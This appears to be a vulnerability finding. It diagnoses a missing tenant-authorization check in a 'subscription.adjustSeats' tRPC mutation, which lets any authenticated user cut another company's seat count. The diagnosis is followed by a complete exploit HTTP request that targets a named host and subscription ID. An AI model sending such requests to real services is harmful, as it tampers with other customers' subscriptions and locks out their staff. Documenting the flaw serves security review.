diagnosis: The mutation directly updates allocatedSeats for input.subscriptionId without verifying that ctx.user is the tenant administrator for that subscription. An attacker can downgrade seats of competitor enterprise subscriptions, locking out their staff.
exploit_request:
POST /trpc/subscription.adjustSeats HTTP/1.1
Host: manage.cloudsuite.com
Content-Type: application/json
Authorization: Bearer <attacker_jwt>

{"subscriptionId": "sub_enterprise_38190", "seatCount": 1}
